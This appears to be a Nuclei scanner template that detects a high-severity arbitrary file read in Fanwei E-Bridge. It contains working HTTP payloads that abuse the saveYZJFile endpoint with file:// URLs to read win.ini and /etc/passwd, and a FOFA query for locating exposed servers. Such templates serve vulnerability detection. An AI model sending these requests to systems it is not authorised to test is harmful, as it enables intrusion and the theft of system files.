id: fanwei-e-bridge-file-read

info:
  name: Fanwei E-Bridge File Read
  author: zp857
  severity: high
  reference: https://moresec.yuque.com/iixlqz/wnv3e6/qvnyp5
  tags: fanwei-e-bridge,lfi
  metadata:
    fofa-query: 'app="泛微-云桥e-Bridge" || title="泛微云桥e-Bridge"'

requests:
  - raw:
      - |
        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - filepath
          - filesize

      - type: status
        status:
          - 200
